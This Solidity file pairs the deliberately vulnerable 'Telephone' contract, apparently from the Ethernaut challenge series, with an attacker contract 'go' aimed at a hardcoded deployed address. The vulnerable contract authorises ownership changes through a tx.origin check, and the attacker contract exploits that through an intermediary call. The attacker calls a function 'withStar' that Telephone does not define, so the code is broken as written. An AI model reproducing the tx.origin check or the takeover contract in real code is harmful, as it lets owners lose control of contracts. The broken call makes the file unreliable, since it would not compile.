
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract go {
    function changeOwner(address _guess) public{
        Telephone(0xb9623171f02f67ddd148e24E32ce92e7f202B807).withStar(_guess);
    }
}

